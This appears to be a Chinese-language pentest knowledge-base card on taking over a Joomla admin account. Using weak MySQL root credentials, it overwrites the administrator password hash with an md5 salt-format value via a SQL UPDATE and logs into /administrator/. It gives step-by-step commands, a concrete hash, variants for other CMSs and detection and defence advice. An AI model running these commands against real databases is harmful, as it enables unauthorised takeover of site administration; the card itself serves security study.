---
id: web-php-joomla-db-root-reset-admin-password-hash
title: 拿到 MySQL root 后直接 UPDATE Joomla 用户表覆盖管理员口令哈希进入后台
type: scenario
domain: web
path: web/php
technique: cms-db-admin-password-hash-overwrite
tags:
- joomla
- cms
- mysql
- password-reset
- weak-credential
- database-admin
- pentest
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-13
  verified_at: '2026-11-08T07:28:35+08:00'
  notes: '已对照原文与图核对：图02 fscan 得 mysql 172.20.10.3:3306:root 123，图05 Navicat 见表前缀 am2zu_，图07 mysql 执行 update am2zu_users set password=\"d2064d358136996bd22421584a7ccb33e:trd7TVKHx6dMeoMmBVxYmg0vuXEA199\" where username=\"administrator\"（Rows matched: 1 Changed: 1），随后登入 /administrator/，与卡片的 『DB 写权限→覆盖管理员哈希→登录后台』一致；Joomla 3.x 同时兼容 bcrypt 与 md5(password+salt):salt 的说明与图06 原 bcrypt 值/改后旧格式可登录相符。瑕疵（不影响结论）：卡片正文中的盐串与截图有若干字符差异（Mq/Meo、Yng/Ymg），盐为攻击者任选、机制不受影响。未验证点：原文未给出哈希算法细节与表前缀来源，卡片以通识补齐；目标为靶场；frontmatter 无 sources/source_url；未 set affected_versions(原文仅 Joomla 3.9.12 目标环境版本，非受影响区间)。'
url: /docs/web/php/web-php-joomla-db-root-reset-admin-password-hash/
draft: false
kb_aliases:
- Joomla 后台密码重置
- 数据库权限改管理员口令
- am2zu_users password 覆盖
- CMS 口令哈希写回
---

## 一句话结论

外网扫描发现 MySQL 使用 `root/123` 弱口令后，直接连库执行 `UPDATE <前缀>_users SET password='<已知口令的旧格式哈希>' WHERE username='administrator'`，把 Joomla 后台超级管理员口令覆盖为自己已知的值（本题 `administrator/112233`），无需破解原哈希即可登录后台，为后续模板编辑 getshell 铺路。

## 原理

- Joomla 的用户凭据存于 `<表前缀>_users` 表的 `password` 字段。Joomla 3.x 兼容两种哈希格式：bcrypt（`$2y$...`）与旧式 `md5(password + salt) : salt`（32 位十六进制哈希 + 冒号 + 随机盐）。
- 攻击者不必破解原哈希：只要用**自己选定的明文口令**按旧格式算出 `md5(明文+盐):盐` 写回该字段，登录时 Joomla 会按存储格式选择对应校验逻辑，旧格式仍被接受，于是该明文口令即为新管理员口令。
- 数据库层没有"口令变更需二次校验/审计"的机制，谁有库写权限谁就能改应用认证状态；这是"DB 管理权限 → CMS 后台权限"的直接跃迁。
- 本题实例：`update am2zu_users set password = "d2064d358136996bd22421584a7ccb33e:trd7TVKHx6dMqMmBVxYng0vuXEA199" where username="administrator";`（哈希+盐对应明文 112233），随后以 administrator/112233 登录 `/administrator/`。
- 前置来源：MySQL root 弱口令（fscan 扫到 `3306:root 123`）、配置泄露、备份或未授权访问等任何能拿到 DB 写权限的途径。

## 触发条件

- 能连接目标 MySQL 且对 Joomla 库有 UPDATE 权限（root 或同权账号）；
- 已知表前缀（本题 `am2zu_`，可从 joomscan/配置/信息_schema 得到）与管理员用户名；
- 应用校验逻辑仍兼容旧式哈希格式；
- 后台登录入口可达（`/administrator/`）。

## 利用步骤

1. 用拿到的 DB 账号连接：`mysql -uroot -p<口令> -h <target> -P 3306`。
2. `show databases;` 找到 Joomla 库，`use <库>;`，查表前缀：`<前缀>_users`。
3. 本地按 `md5(选定明文 + 随机盐)` 生成 `哈希:盐` 字符串。
4. 执行 `UPDATE <前缀>_users SET password='<哈希:盐>' WHERE username='administrator';`。
5. 用选定明文口令登录后台，进入模板/扩展管理做后续 getshell。

## PoC

```sql
-- 已知明文 112233、盐 <salt>，哈希 = md5('112233' || '<salt>')
USE joomla;
UPDATE am2zu_users
SET password = '<md5(明文+盐)>:<盐>'
WHERE username = 'administrator';
```

```bash
mysql -uroot -p123 -h <target> -P 3306 -e "<上述 UPDATE>"
# 随后浏览器登录 /administrator/  用户名 administrator / 口令 112233
```

说明：结构复现的通用命令，表前缀/哈希格式/口令需按目标版本调整；不访问、不执行。

## 变体与关联

- 变体：Joomla 4/其它 CMS（WordPress、Drupal、Dedecms）同理——拿到库写权限后覆盖管理员哈希或插入新管理员；不同 CMS 的哈希算法与表名需对应替换。
- 变体：若只兼容 bcrypt，可用 `password_hash`/Joomla 自带算法生成新 bcrypt 哈希写回；或直接用 `INSERT` 新增超级管理员行。
- 变体：无 UPDATE 权限时，可借配置泄露的 DB 账号读表拿哈希离线破解；或利用 CMS 未授权 API 读配置。
- 关联：[[web-php-rce-joomla-admin-template-editor-webshell]]（进入后台后的模板编辑 getshell）；[[web-php-joomla-api-config-application-public-db-credential-leak]]（另一条拿 DB 凭据的途径）。

## 检测与防御

- 检测：数据库审计中 `<前缀>_users` 表 password 字段被非应用账号 UPDATE；后台出现新口令登录、异常时间/来源的管理员登录。
- 检测：MySQL 对公网开放且使用弱口令（root/123）；fscan 类扫描器的批量认证尝试。
- 防御：MySQL 禁止公网监听、强制强口令与最小权限账号（应用账号不给 root、不给 UPDATE 用户表之外的权限）。
- 防御：应用侧对管理员口令变更做二次验证/审计告警；数据库与 Web 应用分离部署、配置最小权限；及时升级 CMS 修复已知未授权接口。
